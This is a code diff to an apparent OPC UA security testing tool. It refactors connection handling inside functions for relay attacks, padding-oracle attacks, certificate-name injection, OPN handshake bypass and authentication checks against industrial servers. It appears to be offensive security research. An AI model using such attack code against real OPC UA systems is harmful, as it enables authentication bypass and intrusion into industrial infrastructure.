@@ -92,7 +92,9 @@ def chunkable_opc_exchange(sock : socket, request : OpcMessage, response_obj : O
       yield response    
 
 # Sets up a binary TCP connection, does a plain hello and simply ignores the server's size and chunking wishes.
-def connect_and_hello(host : str, port : int) -> socket:
+def connect_and_hello(url : str) -> socket:
+  proto, host, port = parse_endpoint_url(url)
+  assert proto == TransportProtocol.TCP_BINARY
   sock = create_connection((host,port))
   opc_exchange(sock, HelloMessage(
     version=0,
@@ -100,7 +102,7 @@ def connect_and_hello(host : str, port : int) -> socket:
     sendBufferSize=2**16,
     maxMessageSize=2**24,
     maxChunkCount=2**8,
-    endpointUrl=f'opc.tcp://{host}:{port}/',
+    endpointUrl=url,
   ), AckMessage())
   return sock
 
@@ -295,26 +297,32 @@ def generic_exchange(
 
 # Request endpoint information from a server.
 def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
-  if ep_url.startswith('opc.tcp://'):
-    _, host, port = parse_endpoint_url(ep_url)
-    with connect_and_hello(host, port) as sock:
-      chan = unencrypted_opn(sock)
-      resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
-        requestHeader=simple_requestheader(),
-        endpointUrl=ep_url,
-        localeIds=[],
-        profileUris=[],
+  try:  
+    if ep_url.startswith('opc.tcp://'):
+      with connect_and_hello(ep_url) as sock:
+        chan = unencrypted_opn(sock)
+        resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
+          requestHeader=simple_requestheader(),
+          endpointUrl=ep_url,
+          localeIds=[],
+          profileUris=[],
+        )
+    else:
+      assert(parse_endpoint_url(ep_url)[0] == TransportProtocol.HTTPS)
+      resp = https_exchange(ep_url, None, getEndpointsRequest, getEndpointsResponse, 
+          requestHeader=simple_requestheader(),
+          endpointUrl=ep_url,
+          localeIds=[],
+          profileUris=[],
       )
-  else:
-    assert(parse_endpoint_url(ep_url)[0] == TransportProtocol.HTTPS)
-    resp = https_exchange(f'{ep_url.rstrip("/")}/discovery', None, getEndpointsRequest, getEndpointsResponse, 
-        requestHeader=simple_requestheader(),
-        endpointUrl=ep_url,
-        localeIds=[],
-        profileUris=[],
-    )
-      
-  return resp.endpoints
+        
+    return resp.endpoints
+  except Exception as ex:
+    if ep_url.endswith('/discovery'):
+      raise ex
+    else:
+      # Try again while adding /discovery to URL.
+      return get_endpoints(f'{ep_url.rstrip("/")}/discovery')
 
 
 # Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
@@ -519,8 +527,7 @@ def relay_attack(source_url : str, target_url : str, demo : bool):
           mainchan = tep.endpointUrl
         elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE and supports_usercert:
           # When only a TCP target is available we can still try to spoof a user cert.
-          _, thost, tport = parse_endpoint_url(tep.endpointUrl)
-          tmpsock = connect_and_hello(thost, tport)
+          tmpsock = connect_and_hello(tep.endpointUrl)
           mainchan = unencrypted_opn(tmpsock)
           prefercert = True
         else:
@@ -595,9 +602,7 @@ PO_SOCKET_TIMEOUT = 3
     
 class OPNPaddingOracle(PaddingOracle):
   def _setup(self):
-    proto, host, port = parse_endpoint_url(self._endpoint.endpointUrl)
-    assert proto == TransportProtocol.TCP_BINARY
-    self._socket = connect_and_hello(host, port)
+    self._socket = connect_and_hello(self._endpoint.endpointUrl)
     self._msg = OpenSecureChannelMessage(
       secureChannelId=0,
       securityPolicyUri=SecurityPolicy.BASIC128RSA15,
@@ -654,9 +659,9 @@ class PasswordPaddingOracle(PaddingOracle):
     self._policyId = self._preferred_tokenpolicy(endpoint).policyId
   
   def _setup(self):
-    proto, host, port = parse_endpoint_url(self._endpoint.endpointUrl)
+    proto, _, _ = parse_endpoint_url(self._endpoint.endpointUrl)
     if proto == TransportProtocol.TCP_BINARY:
-      sock = connect_and_hello(host, port)
+      sock = connect_and_hello(self._endpoint.endpointUrl)
       self._chan = unencrypted_opn(sock)
     else:
       assert proto == TransportProtocol.HTTPS
@@ -1120,9 +1125,9 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
     
   def trylogin():
     try:
-      proto, host, port = parse_endpoint_url(url)
+      proto, _, _ = parse_endpoint_url(url)
       if proto == TransportProtocol.TCP_BINARY:
-        sock = connect_and_hello(host, port)
+        sock = connect_and_hello(url)
         chan = authenticated_opn(sock, ep, mycert, privkey)
         log_success('Certificate was accepted during OPN handshake. Will now try to create a session with it.')
       else:
@@ -1254,7 +1259,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
   oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold, timing_expansion)
   
   log('Performing the OPN handshake...')
-  login_sock = connect_and_hello(lhost, lport)
+  login_sock = connect_and_hello(login_endpoint.endpointUrl)
   opn_reply = opc_exchange(login_sock, opn_req)
   
   log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
@@ -1439,8 +1444,8 @@ def auth_check(url : str, skip_none : bool, demo : bool):
       if ep.securityPolicyUri == SecurityPolicy.NONE:
         try:
           log(f'Trying to log in to None endpoint {ep.endpointUrl}')
-          proto, host, port = parse_endpoint_url(url)
-          chan = unencrypted_opn(connect_and_hello(host, port)) if proto == TransportProtocol.TCP_BINARY else url
+          proto, _, _ = parse_endpoint_url(url)
+          chan = unencrypted_opn(connect_and_hello(url)) if proto == TransportProtocol.TCP_BINARY else url
           createreply = generic_exchange(chan, SecurityPolicy.NONE, createSessionRequest, createSessionResponse, 
             requestHeader=simple_requestheader(),
             clientDescription=applicationDescription.create(
